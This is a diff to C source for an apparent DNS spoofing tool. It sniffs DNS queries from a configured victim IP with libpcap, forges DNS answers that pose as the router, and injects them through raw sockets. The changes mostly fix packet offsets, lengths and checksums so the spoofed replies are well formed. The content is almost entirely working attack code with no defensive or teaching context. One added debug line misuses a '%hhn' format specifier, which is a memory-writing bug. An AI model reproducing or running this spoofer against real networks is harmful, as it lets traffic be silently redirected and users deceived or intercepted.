@@ -7,7 +7,14 @@ void dns_sniff(struct config *c)
     struct bpf_program fp;
     bpf_u_int32 maskp;
     bpf_u_int32 netp;
-    char filter_exp[] = "udp dst port 53";
+    int filter_len = 28;
+
+    char filter_exp[filter_len + strlen(getIPString(c->victimIP))];
+
+    snprintf(filter_exp, filter_len + strlen(getIPString(c->victimIP)), "ip src %s and udp dst port 53", getIPString(c->victimIP));
+
+    printf("\nVictim: %hhn %s \n", c->victimIP, getIPString(c->victimIP));
+    printf("filter: %s\n", filter_exp);
 
     pcap_lookupnet(c->interfaceName, &netp, &maskp, errbuf);
 
@@ -47,12 +54,12 @@ void handle_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char 
     struct config *c = (struct config *)args;
 
     packet_len = sizeof(struct my_ip) + sizeof(struct udp_header) +
-                 sizeof(struct dns_header) + sizeof(struct dns_answer) +
+                 sizeof(struct dns_header) + sizeof(struct dns_answer) - 4 +
                  sizeof(struct dns_query) + c->targetLen;
     ;
 
     spoof_packet = (u_char *)malloc(packet_len);
-    dns_len = sizeof(struct dns_header) + sizeof(struct dns_answer) + sizeof(struct dns_query) + c->targetLen;
+    dns_len = sizeof(struct dns_header) + sizeof(struct dns_answer) + sizeof(struct dns_query) + c->targetLen - 4;
 
     spoof_ip = (struct my_ip *)malloc(sizeof(struct my_ip));
     spoof_udp = (struct udp_header *)malloc(sizeof(struct udp_header));
@@ -60,11 +67,13 @@ void handle_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char 
 
     handle_IP(pkthdr, packet, spoof_ip);
     handle_UDP(packet, spoof_udp);
+    printf("New: %d\n", spoof_udp->len);
+
     handle_DNS(c, packet, dns_spoof);
 
     memcpy(spoof_packet, spoof_ip, sizeof(struct my_ip));
-    memcpy(spoof_packet, spoof_udp, sizeof(struct udp_header));
-    memcpy(spoof_packet, dns_spoof, dns_len);
+    memcpy(spoof_packet + sizeof(struct my_ip), spoof_udp, sizeof(struct udp_header));
+    memcpy(spoof_packet + sizeof(struct my_ip) + sizeof(struct udp_header), dns_spoof, dns_len);
 
     struct pseudo_header pseudo_header;
     memcpy(&pseudo_header.source_address, &c->routerIP, IP_LEN);
@@ -79,7 +88,14 @@ void handle_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char 
 
     spoof_udp->sum = in_cksum((unsigned short *)temp_header, sizeof(struct pseudo_header) + dns_len);
 
-    send_dns_answer(inet_ntoa(spoof_ip->ip_dst), ntohs(spoof_udp->dport), spoof_packet, packet_len);
+    for (int x = 0; x < packet_len; x++)
+    {
+        if (x % 10 == 0 && x != 0)
+            fprintf(stdout, "\n");
+        fprintf(stdout, "%02x ", *(spoof_packet + x));
+    }
+
+    send_dns_answer(inet_ntoa(spoof_ip->ip_dst), spoof_udp->dport, spoof_packet, packet_len);
 }
 
 void handle_IP(const struct pcap_pkthdr *pkthdr, const u_char *packet, struct my_ip *spoof_ip)
@@ -104,10 +120,15 @@ void handle_IP(const struct pcap_pkthdr *pkthdr, const u_char *packet, struct my
     hlen = IP_HL(ip);
     version = IP_V(ip);
 
+    fprintf(stdout, "\n\nOrig: \n");
+    fprintf(stdout, "Src: %s -> ", inet_ntoa(ip->ip_src));
+    fprintf(stdout, "Dst: %s \n\n", inet_ntoa(ip->ip_dst));
+
     // Spoof IP
     memcpy(spoof_ip, ip, sizeof(struct my_ip));
     memcpy(&spoof_ip->ip_dst, &ip->ip_src, IP_LEN);
     memcpy(&spoof_ip->ip_src, &ip->ip_dst, IP_LEN);
+
     spoof_ip->ip_len += 16;
     spoof_ip->ip_sum = in_cksum((u_short *)spoof_ip, sizeof(struct my_ip));
 
@@ -123,7 +144,6 @@ void handle_IP(const struct pcap_pkthdr *pkthdr, const u_char *packet, struct my
     {
         fprintf(stdout, "Bad header length %d \n", hlen);
     }
-
     // Ensure that we have as much of the packet as we should
     if (length < len)
         printf("\nTruncated IP - %d bytes missing\n", len - length);
@@ -144,7 +164,7 @@ void handle_UDP(const u_char *packet, struct udp_header *spoof_udp)
     memcpy(spoof_udp, udp, sizeof(struct udp_header));
     spoof_udp->dport = udp->sport;
     spoof_udp->sport = udp->dport;
-    spoof_udp->len += 16;
+    spoof_udp->len = htons(ntohs(udp->len) + 16);
 }
 
 void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof)
@@ -153,10 +173,10 @@ void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof)
     struct dns_answer *dns_answer;
     struct dns_query *dns_query;
 
-    int frontLen = +ETH_HEADER_LENGTH + sizeof(struct my_ip) + sizeof(struct udp_header);
+    int frontLen = ETH_HEADER_LENGTH + sizeof(struct my_ip) + sizeof(struct udp_header);
     dns_header = (struct dns_header *)(packet + frontLen);
-    dns_answer = (struct dns_answer *)(packet + frontLen + sizeof(struct dns_header));
-    dns_query = (struct dns_query *)(packet + frontLen + sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen);
+    dns_query = (struct dns_query *)(packet + frontLen + sizeof(struct dns_header) + c->targetLen);
+    dns_answer = (struct dns_answer *)(packet + frontLen + sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen);
 
     dns_header->flags = htons(0x8180);
     dns_header->ancount = htons(1);
@@ -170,8 +190,20 @@ void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof)
 
     // Fill dns spoof
     memcpy(dns_spoof, dns_header, sizeof(struct dns_header));
-    memcpy(dns_spoof, dns_answer, sizeof(struct dns_answer));
-    memcpy(dns_spoof, dns_query, sizeof(struct dns_query) + c->targetLen);
+    memcpy(dns_spoof + sizeof(struct dns_header), packet + frontLen + sizeof(struct dns_header), c->targetLen);
+
+    memcpy(dns_spoof + sizeof(struct dns_header) + c->targetLen, dns_query, sizeof(struct dns_query));
+
+    printf("Q: %02x %02x | ", *dns_query->type, *dns_query->type + 1);
+    printf(" %02x %02x\n", *dns_query->class, *dns_query->class + 1);
+
+    int ahead = sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen;
+    memcpy(dns_spoof + ahead, &dns_answer->name, 2);
+    memcpy(dns_spoof + (ahead += 2), &dns_answer->type, 2);
+    memcpy(dns_spoof + (ahead += 2), &dns_answer->class, 2);
+    memcpy(dns_spoof + (ahead += 2), &dns_answer->ttl, 4);
+    memcpy(dns_spoof + (ahead += 4), &dns_answer->len, 2);
+    memcpy(dns_spoof + (ahead += 2), &dns_answer->addr, 4);
 }
 
 unsigned short in_cksum(unsigned short *ptr, int nbytes)
@@ -214,7 +246,7 @@ void send_dns_answer(char *ip, u_short port, u_char *packet, int packlen)
         return;
     }
     to_addr.sin_family = AF_INET;
-    to_addr.sin_port = htons(port);
+    to_addr.sin_port = port;
     to_addr.sin_addr.s_addr = inet_addr(ip);
 
     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
@@ -222,8 +254,6 @@ void send_dns_answer(char *ip, u_short port, u_char *packet, int packlen)
         fprintf(stderr, "Error at setsockopt()");
         return;
     }
-
-    fprintf(stdout, "Orig IP: %s | Port: %d\n", ip, port);
 
     bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
     if (bytes_sent < 0)
